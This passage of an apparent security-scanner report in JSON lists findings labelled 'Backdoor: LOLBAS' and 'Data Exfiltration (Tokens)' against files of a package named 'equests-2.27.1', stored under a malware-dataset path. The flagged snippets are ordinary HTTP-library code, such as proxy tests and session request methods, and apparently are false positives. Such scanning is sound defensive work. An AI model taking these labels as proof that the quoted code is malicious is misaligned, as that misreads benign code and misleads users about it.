                  "endLine": 669,
                  "endColumn": 29,
                  "snippet": {
                    "text": "            ('http://172.16.1.1:5000/', '172.16.1.1'),\n            ('http://user:pass@172.16.1.1', '172.16.1.1'),\n            ('http://user:pass@172.16.1.1:5000', '172.16.1.1'),\n            ('http://hostname/', 'hostname'),\n            ('http://hostname:5000/', 'hostname'),\n            ('http://user:pass@hostname', 'hostname'),\n            ('http://user:pass@hostname:5000', 'hostname'),\n",
                    "rendered": {
                      "text": "            ('http://172.16.1.1:5000/', '172.16.1.1'),\n            ('http://user:pass@172.16.1.1', '172.16.1.1'),\n            ('http://user:pass@172.16.1.1:5000', '172.16.1.1'),\n            ('http://hostname/', 'hostname'),\n            ('http://hostname:5000/', 'hostname'),\n            ('http://user:pass@hostname', 'hostname'),\n            ('http://user:pass@hostname:5000', 'hostname'),\n",
                      "markdown": "`            ('http://172.16.1.1:5000/', '172.16.1.1'),\n            ('http://user:pass@172.16.1.1', '172.16.1.1'),\n            ('http://user:pass@172.16.1.1:5000', '172.16.1.1'),\n            ('http://hostname/', 'hostname'),\n            ('http://hostname:5000/', 'hostname'),\n            ('http://user:pass@hostname', 'hostname'),\n            ('http://user:pass@hostname:5000', 'hostname'),\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_utils.py"
                },
                "region": {
                  "startLine": 564,
                  "startColumn": 27,
                  "endLine": 564,
                  "endColumn": 31,
                  "snippet": {
                    "text": "    ))\ndef test_iter_slices(value, length):\n    if length is None or (length <= 0 and len(value) > 0):\n        # Reads all content at once\n        assert len(list(iter_slices(value, length))) == 1\n    else:\n        assert len(list(iter_slices(value, 1))) == length\n",
                    "rendered": {
                      "text": "    ))\ndef test_iter_slices(value, length):\n    if length is None or (length <= 0 and len(value) > 0):\n        # Reads all content at once\n        assert len(list(iter_slices(value, length))) == 1\n    else:\n        assert len(list(iter_slices(value, 1))) == length\n",
                      "markdown": "`    ))\ndef test_iter_slices(value, length):\n    if length is None or (length <= 0 and len(value) > 0):\n        # Reads all content at once\n        assert len(list(iter_slices(value, length))) == 1\n    else:\n        assert len(list(iter_slices(value, 1))) == length\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_utils.py"
                },
                "region": {
                  "startLine": 53,
                  "startColumn": 56,
                  "endLine": 53,
                  "endColumn": 60,
                  "snippet": {
                    "text": "\n    @pytest.mark.parametrize('error', [IOError, OSError])\n    def test_super_len_handles_files_raising_weird_errors_in_tell(self, error):\n        \"\"\"If tell() raises errors, assume the cursor is at position zero.\"\"\"\n        class BoomFile(object):\n            def __len__(self):\n                return 5\n",
                    "rendered": {
                      "text": "\n    @pytest.mark.parametrize('error', [IOError, OSError])\n    def test_super_len_handles_files_raising_weird_errors_in_tell(self, error):\n        \"\"\"If tell() raises errors, assume the cursor is at position zero.\"\"\"\n        class BoomFile(object):\n            def __len__(self):\n                return 5\n",
                      "markdown": "`\n    @pytest.mark.parametrize('error', [IOError, OSError])\n    def test_super_len_handles_files_raising_weird_errors_in_tell(self, error):\n        \"\"\"If tell() raises errors, assume the cursor is at position zero.\"\"\"\n        class BoomFile(object):\n            def __len__(self):\n                return 5\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_utils.py"
                },
                "region": {
                  "startLine": 675,
                  "startColumn": 68,
                  "endLine": 675,
                  "endColumn": 72,
                  "snippet": {
                    "text": "            ('http://user:pass@hostname:5000', 'hostname'),\n    ))\ndef test_should_bypass_proxies_pass_only_hostname(url, expected, mocker):\n    \"\"\"The proxy_bypass function should be called with a hostname or IP without\n    a port number or auth credentials.\n    \"\"\"\n    proxy_bypass = mocker.patch('requests.utils.proxy_bypass')\n",
                    "rendered": {
                      "text": "            ('http://user:pass@hostname:5000', 'hostname'),\n    ))\ndef test_should_bypass_proxies_pass_only_hostname(url, expected, mocker):\n    \"\"\"The proxy_bypass function should be called with a hostname or IP without\n    a port number or auth credentials.\n    \"\"\"\n    proxy_bypass = mocker.patch('requests.utils.proxy_bypass')\n",
                      "markdown": "`            ('http://user:pass@hostname:5000', 'hostname'),\n    ))\ndef test_should_bypass_proxies_pass_only_hostname(url, expected, mocker):\n    \"\"\"The proxy_bypass function should be called with a hostname or IP without\n    a port number or auth credentials.\n    \"\"\"\n    proxy_bypass = mocker.patch('requests.utils.proxy_bypass')\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/tests/test_utils.py"
                },
                "region": {
                  "startLine": 166,
                  "startColumn": 19,
                  "endLine": 166,
                  "endColumn": 23,
                  "snippet": {
                    "text": "\n\nclass TestGetEnvironProxies:\n    \"\"\"Ensures that IP addresses are correctly matches with ranges\n    in no_proxy variable.\n    \"\"\"\n\n",
                    "rendered": {
                      "text": "\n\nclass TestGetEnvironProxies:\n    \"\"\"Ensures that IP addresses are correctly matches with ranges\n    in no_proxy variable.\n    \"\"\"\n\n",
                      "markdown": "`\n\nclass TestGetEnvironProxies:\n    \"\"\"Ensures that IP addresses are correctly matches with ranges\n    in no_proxy variable.\n    \"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/sessions.py"
                },
                "region": {
                  "startLine": 709,
                  "startColumn": 36,
                  "endLine": 709,
                  "endColumn": 41,
                  "snippet": {
                    "text": "            # with cURL.\n            if verify is True or verify is None:\n                verify = (os.environ.get('REQUESTS_CA_BUNDLE') or\n                          os.environ.get('CURL_CA_BUNDLE'))\n\n        # Merge all the kwargs.\n        proxies = merge_setting(proxies, self.proxies)\n",
                    "rendered": {
                      "text": "            # with cURL.\n            if verify is True or verify is None:\n                verify = (os.environ.get('REQUESTS_CA_BUNDLE') or\n                          os.environ.get('CURL_CA_BUNDLE'))\n\n        # Merge all the kwargs.\n        proxies = merge_setting(proxies, self.proxies)\n",
                      "markdown": "`            # with cURL.\n            if verify is True or verify is None:\n                verify = (os.environ.get('REQUESTS_CA_BUNDLE') or\n                          os.environ.get('CURL_CA_BUNDLE'))\n\n        # Merge all the kwargs.\n        proxies = merge_setting(proxies, self.proxies)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/sessions.py"
                },
                "region": {
                  "startLine": 708,
                  "startColumn": 36,
                  "endLine": 708,
                  "endColumn": 41,
                  "snippet": {
                    "text": "            # Look for requests environment configuration and be compatible\n            # with cURL.\n            if verify is True or verify is None:\n                verify = (os.environ.get('REQUESTS_CA_BUNDLE') or\n                          os.environ.get('CURL_CA_BUNDLE'))\n\n        # Merge all the kwargs.\n",
                    "rendered": {
                      "text": "            # Look for requests environment configuration and be compatible\n            # with cURL.\n            if verify is True or verify is None:\n                verify = (os.environ.get('REQUESTS_CA_BUNDLE') or\n                          os.environ.get('CURL_CA_BUNDLE'))\n\n        # Merge all the kwargs.\n",
                      "markdown": "`            # Look for requests environment configuration and be compatible\n            # with cURL.\n            if verify is True or verify is None:\n                verify = (os.environ.get('REQUESTS_CA_BUNDLE') or\n                          os.environ.get('CURL_CA_BUNDLE'))\n\n        # Merge all the kwargs.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/sessions.py"
                },
                "region": {
                  "startLine": 700,
                  "startColumn": 30,
                  "endLine": 700,
                  "endColumn": 35,
                  "snippet": {
                    "text": "        # Gather clues from the surrounding environment.\n        if self.trust_env:\n            # Set environment's proxies.\n            no_proxy = proxies.get('no_proxy') if proxies is not None else None\n            env_proxies = get_environ_proxies(url, no_proxy=no_proxy)\n            for (k, v) in env_proxies.items():\n                proxies.setdefault(k, v)\n",
                    "rendered": {
                      "text": "        # Gather clues from the surrounding environment.\n        if self.trust_env:\n            # Set environment's proxies.\n            no_proxy = proxies.get('no_proxy') if proxies is not None else None\n            env_proxies = get_environ_proxies(url, no_proxy=no_proxy)\n            for (k, v) in env_proxies.items():\n                proxies.setdefault(k, v)\n",
                      "markdown": "`        # Gather clues from the surrounding environment.\n        if self.trust_env:\n            # Set environment's proxies.\n            no_proxy = proxies.get('no_proxy') if proxies is not None else None\n            env_proxies = get_environ_proxies(url, no_proxy=no_proxy)\n            for (k, v) in env_proxies.items():\n                proxies.setdefault(k, v)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/sessions.py"
                },
                "region": {
                  "startLine": 635,
                  "startColumn": 23,
                  "endLine": 635,
                  "endColumn": 28,
                  "snippet": {
                    "text": "\n        # Set up variables needed for resolve_redirects and dispatching of hooks\n        allow_redirects = kwargs.pop('allow_redirects', True)\n        stream = kwargs.get('stream')\n        hooks = request.hooks\n\n        # Get the appropriate adapter to use\n",
                    "rendered": {
                      "text": "\n        # Set up variables needed for resolve_redirects and dispatching of hooks\n        allow_redirects = kwargs.pop('allow_redirects', True)\n        stream = kwargs.get('stream')\n        hooks = request.hooks\n\n        # Get the appropriate adapter to use\n",
                      "markdown": "`\n        # Set up variables needed for resolve_redirects and dispatching of hooks\n        allow_redirects = kwargs.pop('allow_redirects', True)\n        stream = kwargs.get('stream')\n        hooks = request.hooks\n\n        # Get the appropriate adapter to use\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/sessions.py"
                },
                "region": {
                  "startLine": 611,
                  "startColumn": 19,
                  "endLine": 611,
                  "endColumn": 28,
                  "snippet": {
                    "text": "        :rtype: requests.Response\n        \"\"\"\n\n        return self.request('DELETE', url, **kwargs)\n\n    def send(self, request, **kwargs):\n        \"\"\"Send a given PreparedRequest.\n",
                    "rendered": {
                      "text": "        :rtype: requests.Response\n        \"\"\"\n\n        return self.request('DELETE', url, **kwargs)\n\n    def send(self, request, **kwargs):\n        \"\"\"Send a given PreparedRequest.\n",
                      "markdown": "`        :rtype: requests.Response\n        \"\"\"\n\n        return self.request('DELETE', url, **kwargs)\n\n    def send(self, request, **kwargs):\n        \"\"\"Send a given PreparedRequest.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/sessions.py"
                },
                "region": {
                  "startLine": 601,
                  "startColumn": 19,
                  "endLine": 601,
                  "endColumn": 28,
                  "snippet": {
                    "text": "        :rtype: requests.Response\n        \"\"\"\n\n        return self.request('PATCH', url, data=data, **kwargs)\n\n    def delete(self, url, **kwargs):\n        r\"\"\"Sends a DELETE request. Returns :class:`Response` object.\n",
                    "rendered": {
                      "text": "        :rtype: requests.Response\n        \"\"\"\n\n        return self.request('PATCH', url, data=data, **kwargs)\n\n    def delete(self, url, **kwargs):\n        r\"\"\"Sends a DELETE request. Returns :class:`Response` object.\n",
                      "markdown": "`        :rtype: requests.Response\n        \"\"\"\n\n        return self.request('PATCH', url, data=data, **kwargs)\n\n    def delete(self, url, **kwargs):\n        r\"\"\"Sends a DELETE request. Returns :class:`Response` object.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/sessions.py"
                },
                "region": {
                  "startLine": 589,
                  "startColumn": 19,
                  "endLine": 589,
                  "endColumn": 28,
                  "snippet": {
                    "text": "        :rtype: requests.Response\n        \"\"\"\n\n        return self.request('PUT', url, data=data, **kwargs)\n\n    def patch(self, url, data=None, **kwargs):\n        r\"\"\"Sends a PATCH request. Returns :class:`Response` object.\n",
                    "rendered": {
                      "text": "        :rtype: requests.Response\n        \"\"\"\n\n        return self.request('PUT', url, data=data, **kwargs)\n\n    def patch(self, url, data=None, **kwargs):\n        r\"\"\"Sends a PATCH request. Returns :class:`Response` object.\n",
                      "markdown": "`        :rtype: requests.Response\n        \"\"\"\n\n        return self.request('PUT', url, data=data, **kwargs)\n\n    def patch(self, url, data=None, **kwargs):\n        r\"\"\"Sends a PATCH request. Returns :class:`Response` object.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/sessions.py"
                },
                "region": {
                  "startLine": 577,
                  "startColumn": 19,
                  "endLine": 577,
                  "endColumn": 28,
                  "snippet": {
                    "text": "        :rtype: requests.Response\n        \"\"\"\n\n        return self.request('POST', url, data=data, json=json, **kwargs)\n\n    def put(self, url, data=None, **kwargs):\n        r\"\"\"Sends a PUT request. Returns :class:`Response` object.\n",
                    "rendered": {
                      "text": "        :rtype: requests.Response\n        \"\"\"\n\n        return self.request('POST', url, data=data, json=json, **kwargs)\n\n    def put(self, url, data=None, **kwargs):\n        r\"\"\"Sends a PUT request. Returns :class:`Response` object.\n",
                      "markdown": "`        :rtype: requests.Response\n        \"\"\"\n\n        return self.request('POST', url, data=data, json=json, **kwargs)\n\n    def put(self, url, data=None, **kwargs):\n        r\"\"\"Sends a PUT request. Returns :class:`Response` object.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/sessions.py"
                },
                "region": {
                  "startLine": 564,
                  "startColumn": 19,
                  "endLine": 564,
                  "endColumn": 28,
                  "snippet": {
                    "text": "        \"\"\"\n\n        kwargs.setdefault('allow_redirects', False)\n        return self.request('HEAD', url, **kwargs)\n\n    def post(self, url, data=None, json=None, **kwargs):\n        r\"\"\"Sends a POST request. Returns :class:`Response` object.\n",
                    "rendered": {
                      "text": "        \"\"\"\n\n        kwargs.setdefault('allow_redirects', False)\n        return self.request('HEAD', url, **kwargs)\n\n    def post(self, url, data=None, json=None, **kwargs):\n        r\"\"\"Sends a POST request. Returns :class:`Response` object.\n",
                      "markdown": "`        \"\"\"\n\n        kwargs.setdefault('allow_redirects', False)\n        return self.request('HEAD', url, **kwargs)\n\n    def post(self, url, data=None, json=None, **kwargs):\n        r\"\"\"Sends a POST request. Returns :class:`Response` object.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/sessions.py"
                },
                "region": {
                  "startLine": 553,
                  "startColumn": 19,
                  "endLine": 553,
                  "endColumn": 28,
                  "snippet": {
                    "text": "        \"\"\"\n\n        kwargs.setdefault('allow_redirects', True)\n        return self.request('OPTIONS', url, **kwargs)\n\n    def head(self, url, **kwargs):\n        r\"\"\"Sends a HEAD request. Returns :class:`Response` object.\n",
                    "rendered": {
                      "text": "        \"\"\"\n\n        kwargs.setdefault('allow_redirects', True)\n        return self.request('OPTIONS', url, **kwargs)\n\n    def head(self, url, **kwargs):\n        r\"\"\"Sends a HEAD request. Returns :class:`Response` object.\n",
                      "markdown": "`        \"\"\"\n\n        kwargs.setdefault('allow_redirects', True)\n        return self.request('OPTIONS', url, **kwargs)\n\n    def head(self, url, **kwargs):\n        r\"\"\"Sends a HEAD request. Returns :class:`Response` object.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/sessions.py"
                },
                "region": {
                  "startLine": 542,
                  "startColumn": 19,
                  "endLine": 542,
                  "endColumn": 28,
                  "snippet": {
                    "text": "        \"\"\"\n\n        kwargs.setdefault('allow_redirects', True)\n        return self.request('GET', url, **kwargs)\n\n    def options(self, url, **kwargs):\n        r\"\"\"Sends a OPTIONS request. Returns :class:`Response` object.\n",
                    "rendered": {
                      "text": "        \"\"\"\n\n        kwargs.setdefault('allow_redirects', True)\n        return self.request('GET', url, **kwargs)\n\n    def options(self, url, **kwargs):\n        r\"\"\"Sends a OPTIONS request. Returns :class:`Response` object.\n",
                      "markdown": "`        \"\"\"\n\n        kwargs.setdefault('allow_redirects', True)\n        return self.request('GET', url, **kwargs)\n\n    def options(self, url, **kwargs):\n        r\"\"\"Sends a OPTIONS request. Returns :class:`Response` object.\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/sessions.py"
                },
                "region": {
                  "startLine": 339,
                  "startColumn": 15,
                  "endLine": 339,
                  "endColumn": 20,
                  "snippet": {
                    "text": "    Or as a context manager::\n\n      >>> with requests.Session() as s:\n      ...     s.get('https://httpbin.org/get')\n      <Response [200]>\n    \"\"\"\n\n",
                    "rendered": {
                      "text": "    Or as a context manager::\n\n      >>> with requests.Session() as s:\n      ...     s.get('https://httpbin.org/get')\n      <Response [200]>\n    \"\"\"\n\n",
                      "markdown": "`    Or as a context manager::\n\n      >>> with requests.Session() as s:\n      ...     s.get('https://httpbin.org/get')\n      <Response [200]>\n    \"\"\"\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/sessions.py"
                },
                "region": {
                  "startLine": 333,
                  "startColumn": 11,
                  "endLine": 333,
                  "endColumn": 16,
                  "snippet": {
                    "text": "\n      >>> import requests\n      >>> s = requests.Session()\n      >>> s.get('https://httpbin.org/get')\n      <Response [200]>\n\n    Or as a context manager::\n",
                    "rendered": {
                      "text": "\n      >>> import requests\n      >>> s = requests.Session()\n      >>> s.get('https://httpbin.org/get')\n      <Response [200]>\n\n    Or as a context manager::\n",
                      "markdown": "`\n      >>> import requests\n      >>> s = requests.Session()\n      >>> s.get('https://httpbin.org/get')\n      <Response [200]>\n\n    Or as a context manager::\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/sessions.py"
                },
                "region": {
                  "startLine": 136,
                  "startColumn": 37,
                  "endLine": 136,
                  "endColumn": 42,
                  "snippet": {
                    "text": "        # Handle default port usage corresponding to scheme.\n        changed_port = old_parsed.port != new_parsed.port\n        changed_scheme = old_parsed.scheme != new_parsed.scheme\n        default_port = (DEFAULT_PORTS.get(old_parsed.scheme, None), None)\n        if (not changed_scheme and old_parsed.port in default_port\n                and new_parsed.port in default_port):\n            return False\n",
                    "rendered": {
                      "text": "        # Handle default port usage corresponding to scheme.\n        changed_port = old_parsed.port != new_parsed.port\n        changed_scheme = old_parsed.scheme != new_parsed.scheme\n        default_port = (DEFAULT_PORTS.get(old_parsed.scheme, None), None)\n        if (not changed_scheme and old_parsed.port in default_port\n                and new_parsed.port in default_port):\n            return False\n",
                      "markdown": "`        # Handle default port usage corresponding to scheme.\n        changed_port = old_parsed.port != new_parsed.port\n        changed_scheme = old_parsed.scheme != new_parsed.scheme\n        default_port = (DEFAULT_PORTS.get(old_parsed.scheme, None), None)\n        if (not changed_scheme and old_parsed.port in default_port\n                and new_parsed.port in default_port):\n            return False\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/sessions.py"
                },
                "region": {
                  "startLine": 90,
                  "startColumn": 45,
                  "endLine": 90,
                  "endColumn": 50,
                  "snippet": {
                    "text": "    if session_hooks is None or session_hooks.get('response') == []:\n        return request_hooks\n\n    if request_hooks is None or request_hooks.get('response') == []:\n        return session_hooks\n\n    return merge_setting(request_hooks, session_hooks, dict_class)\n",
                    "rendered": {
                      "text": "    if session_hooks is None or session_hooks.get('response') == []:\n        return request_hooks\n\n    if request_hooks is None or request_hooks.get('response') == []:\n        return session_hooks\n\n    return merge_setting(request_hooks, session_hooks, dict_class)\n",
                      "markdown": "`    if session_hooks is None or session_hooks.get('response') == []:\n        return request_hooks\n\n    if request_hooks is None or request_hooks.get('response') == []:\n        return session_hooks\n\n    return merge_setting(request_hooks, session_hooks, dict_class)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/sessions.py"
                },
                "region": {
                  "startLine": 87,
                  "startColumn": 45,
                  "endLine": 87,
                  "endColumn": 50,
                  "snippet": {
                    "text": "    This is necessary because when request_hooks == {'response': []}, the\n    merge breaks Session hooks entirely.\n    \"\"\"\n    if session_hooks is None or session_hooks.get('response') == []:\n        return request_hooks\n\n    if request_hooks is None or request_hooks.get('response') == []:\n",
                    "rendered": {
                      "text": "    This is necessary because when request_hooks == {'response': []}, the\n    merge breaks Session hooks entirely.\n    \"\"\"\n    if session_hooks is None or session_hooks.get('response') == []:\n        return request_hooks\n\n    if request_hooks is None or request_hooks.get('response') == []:\n",
                      "markdown": "`    This is necessary because when request_hooks == {'response': []}, the\n    merge breaks Session hooks entirely.\n    \"\"\"\n    if session_hooks is None or session_hooks.get('response') == []:\n        return request_hooks\n\n    if request_hooks is None or request_hooks.get('response') == []:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/sessions.py"
                },
                "region": {
                  "startLine": 297,
                  "startColumn": 71,
                  "endLine": 297,
                  "endColumn": 79,
                  "snippet": {
                    "text": "            username, password = None, None\n\n        if username and password:\n            headers['Proxy-Authorization'] = _basic_auth_str(username, password)\n\n        return new_proxies\n\n",
                    "rendered": {
                      "text": "            username, password = None, None\n\n        if username and password:\n            headers['Proxy-Authorization'] = _basic_auth_str(username, password)\n\n        return new_proxies\n\n",
                      "markdown": "`            username, password = None, None\n\n        if username and password:\n            headers['Proxy-Authorization'] = _basic_auth_str(username, password)\n\n        return new_proxies\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000701"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Tokens)",
            "id": "BD000701"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "./datasets/malware/dataset1/equests-2.27.1.tar.gz/equests-2.27.1.tar/equests-2.27.1/requests/sessions.py"
                },
                "region": {
                  "startLine": 296,
                  "startColumn": 24,
                  "endLine": 296,
                  "endColumn": 32,
                  "snippet": {
